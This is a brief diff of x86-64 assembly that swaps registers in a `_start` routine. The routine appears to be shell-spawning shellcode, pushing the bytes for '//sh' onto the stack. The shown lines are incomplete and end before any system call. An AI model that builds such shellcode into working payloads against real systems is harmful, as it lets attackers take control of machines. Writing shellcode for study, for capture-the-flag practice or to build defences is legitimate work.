@@ -11,9 +11,9 @@
 
     .global _start
 _start:
-    xorl %ecx, %ecx
+    xorl %esi, %esi
 
-    pushq %rcx
+    pushq %rsi
 
     pushw $0x6873
     pushw $0x2f2f
